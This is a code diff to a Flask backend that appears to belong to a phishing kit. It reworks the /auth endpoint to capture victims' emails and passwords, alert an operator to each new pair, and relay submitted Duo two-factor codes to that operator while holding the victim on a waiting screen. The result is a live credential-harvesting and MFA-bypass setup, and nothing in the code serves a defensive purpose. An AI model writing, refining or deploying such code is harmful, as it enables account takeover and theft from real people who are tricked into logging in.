@@ -46,49 +46,58 @@ def set_status(email, status):
 
 @app.post("/auth")
 def auth():
+    # 1. Get incoming data from the frontend request
     req = request.json
-    email = req.get('email').strip()
-    password = req.get('password')
-    duo_code = req.get('duoCode') # Safely get the duoCode from the request
+    email = req['email'].strip()
+    password = req['password']
+    # Safely get the duoCode, which might be an empty string or None
+    incoming_duo_code = req.get('duoCode')
 
- 
+    # 2. Fetch the current user record from the database
+    db_record = Email_statuses.find_one({"email": email})
 
-    email_response = Email_statuses.find_one({"email": email})
-
-    if email_response is None or not email_response.get("status"):
+    # --- Logic Block 1: Handle new users or changed passwords ---
+    # If there's no record or the password differs, it's a new login attempt.
+    if not db_record or db_record.get('password') != password:
+        # Notify operator of the new email/password combination
         get_status_update(email, password)
-        Email_statuses.update_one(
-            {"email": email.strip()},
-            {"$set": {"status": "pending", "password": password}},
-            upsert=True
-        )  
-        return {"status":"pending"}
-    
-    if email_response.get('password') != password :
-        get_status_update(email, password)
-        Email_statuses.update_one(
-            {"email": email.strip()},
-            {"$set": {"status": "pending", "password": password}},
-            upsert=True
-        )
-        return {"status":"pending"}
-
-    if duo_code:
-        # Notify the operator of the received code. THIS IS THE MISSING STEP.
-        send_notification(f"Duo Code received for {email}: {duo_code}")
         
-        # We can keep the user polling by not changing the DB status immediately,
-        # or reset it to pending while the operator uses the code.
-        # Resetting to pending is often safer.
+        # Save the new credentials and reset the state
         Email_statuses.update_one(
             {"email": email},
-            {"$set": {"status": "pending"}}
+            {"$set": {
+                "password": password,
+                "status": "pending",
+                "duoCode": None  # Clear any old Duo code from a previous attempt
+            }},
+            upsert=True
         )
-        return {"status": "pending"} # Keep the user on a waiting screen
+        return {"status": "pending"}
 
+    # --- Logic Block 2: Handle Duo Code Submission ---
+    # This block runs only if the password matches.
+    # We check if a new, non-empty Duo code has been provided.
+    stored_duo_code = db_record.get('duoCode')
+    if incoming_duo_code and incoming_duo_code != stored_duo_code:
+        # A new Duo code has been submitted. Notify the operator.
+        send_notification(f"Duo Code received for {email}: {incoming_duo_code}")
 
-    
-    return {"status": email_response['status']}
+        # Save the new code to the DB and keep the user polling
+        Email_statuses.update_one(
+            {"email": email},
+            {"$set": {
+                "status": "pending",  # Keep the user on a waiting screen
+                "duoCode": incoming_duo_code
+            }}
+        )
+        return {"status": "pending"}
+
+    # --- Logic Block 3: Handle Standard Polling ---
+    # If the password matches and no new Duo code was submitted,
+    # this is a standard poll. Do not send any notification.
+    # Simply return the current status from the database.
+    return {"status": db_record['status']}
+
 
 
 @app.post("/alert")
